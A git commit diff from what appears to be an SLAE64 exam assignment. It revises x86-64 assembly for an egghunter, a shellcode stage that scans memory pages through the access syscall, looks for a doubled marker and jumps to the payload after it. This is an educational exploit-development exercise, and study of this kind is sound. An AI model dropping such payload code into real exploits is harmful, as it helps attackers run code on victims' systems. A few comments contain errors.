0c61ee5e37d763c1bf446741c3cc7e71448ea58e
David West <agentdaffaires@gmail.com>
2018-03-10 22:05:57 -0800

    modified:   3_demo_egghunter/egghunter.s 	3_demo_egghunter/shellcode.c

--- SLAE64ExamAssignmentCode/3_demo_egghunter/egghunter.s
+++ SLAE64ExamAssignmentCode/3_demo_egghunter/egghunter.s
@@ -9,11 +9,9 @@ _start:
 	mov edx, 0x00600000		; estimate of starting location of egg
 L0:
 	or dx, 0xfff			; prep 4096 PAGE_SIZE boundary - no nulls
-					; assumed that all addresses in PAGE are valid|invalid
 L1:
 	inc edx				; 0x...1000 = 4096 PAGE_SIZE, 0x1000++
-	lea rdi, [edx+0x4]		; access pathname = mem addr + [offset] = 1/2 egg -assuming symetry 
-					; assumes if rdi+0x4 is valid then rdi is also valid 
+	lea rdi, [edx+0x4]		; get instructions following egg 
 	; rsi				; mode accessibility check is = F_OK ; assumes rsi = 0
 					; │#  define F_OK  0   /* Test for existence.  */
 	push byte 21			; 0x21 for 32-bit syscall; don't get it confused 
@@ -21,20 +19,13 @@ L1:
 	syscall 
 	cmp al, 0xf2			; ENOET ?
 	jz L0				; inc by PAGE_SIZE ENOENT
-	;cmp al, 0xfe			; EFAULT ?
-	;jz L0				; inc by PAGE_SIZE ENOENT
-
 _egg:
 	mov eax, 0x50905090		; egg - NOP slide
 	mov edi, edx			; scas base - pointer address 
-	scasd				; search for egg then inc 4 bytes
+
+	scasd				; search for egg in egghunter  then inc 4 bytes
 	jnz L1				; if egg not found then inc addr one byte 
-	;scasd 				; search for egg then inc 4 bytes
-	cmp eax, [rdi]			; did we find the egg?
-	jnz L1				; if egg not found then inc addr one byte
+	scasd				; search for the egg in egg PROG then inc 4 bytes
+	jnz L1				; if egg not found then advance addr one byte 
+
 	jmp rdi				; egg found, 8 bytes are skipped, execute shellcode
-	
-;_exit:					; exit not required since we intend to find egg 
-;	xor eax, eax
-;	add al, 60
-;	syscall 
